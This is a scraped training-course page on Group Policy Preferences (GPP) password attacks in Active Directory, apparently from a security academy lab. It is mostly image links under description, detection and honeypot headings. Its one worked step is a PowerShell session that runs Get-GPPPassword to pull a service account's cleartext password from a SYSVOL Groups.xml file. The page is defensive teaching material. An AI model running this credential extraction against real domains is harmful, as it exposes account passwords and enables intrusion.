<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/176/section/1780
// Platform Version: V1
// Module ID: 176
// Module Name: Windows Attacks & Defense
// Module Difficulty: Medium
// Section ID: 1780
// Section Title: GPP Passwords
// Page Title: Windows Attacks & Defense
// Page Number: 05
-->

# GPP Passwords

**Module Name:** Windows Attacks & Defense **Page Number:** 05

#### WINDOWS ATTACKS & DEFENSE

# GPP Passwords

## Description

![https://academy.hackthebox.com/storage/modules/176/A3/GPPkey1.png](https://academy.hackthebox.com/storage/modules/176/A3/GPPkey1.png)

![https://academy.hackthebox.com/storage/modules/176/A3/GPPcPass.png](https://academy.hackthebox.com/storage/modules/176/A3/GPPcPass.png)

## Attack

``` powershell-session
PS C:\Users\bob\Downloads> Import-Module .\Get-GPPPassword.ps1
PS C:\Users\bob\Downloads> Get-GPPPassword

UserName  : svc-iis
NewName   : [BLANK]
Password  : abcd@123
Changed   : [BLANK]
File      : \\EAGLE.LOCAL\SYSVOL\eagle.local\Policies\{73C66DBB-81DA-44D8-BDEF-20BA2C27056D}\
            Machine\Preferences\Groups\Groups.xml
NodeName  : Groups
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80
```

![https://academy.hackthebox.com/storage/modules/176/A3/GPPPass.png](https://academy.hackthebox.com/storage/modules/176/A3/GPPPass.png)

## Prevention

## Detection

![https://academy.hackthebox.com/storage/modules/176/A3/audit1.png](https://academy.hackthebox.com/storage/modules/176/A3/audit1.png)

![https://academy.hackthebox.com/storage/modules/176/A3/audit2.png](https://academy.hackthebox.com/storage/modules/176/A3/audit2.png)

![https://academy.hackthebox.com/storage/modules/176/A3/audit3.png](https://academy.hackthebox.com/storage/modules/176/A3/audit3.png)

## Honeypot

![https://academy.hackthebox.com/storage/modules/176/A3/honeypot4dot3.png](https://academy.hackthebox.com/storage/modules/176/A3/honeypot4dot3.png)

![https://academy.hackthebox.com/storage/modules/176/A3/honeypot4.png](https://academy.hackthebox.com/storage/modules/176/A3/honeypot4.png)

![https://academy.hackthebox.com/storage/modules/176/A3/honeypot4dot2.png](https://academy.hackthebox.com/storage/modules/176/A3/honeypot4dot2.png)

# 

# 

#### Questions

####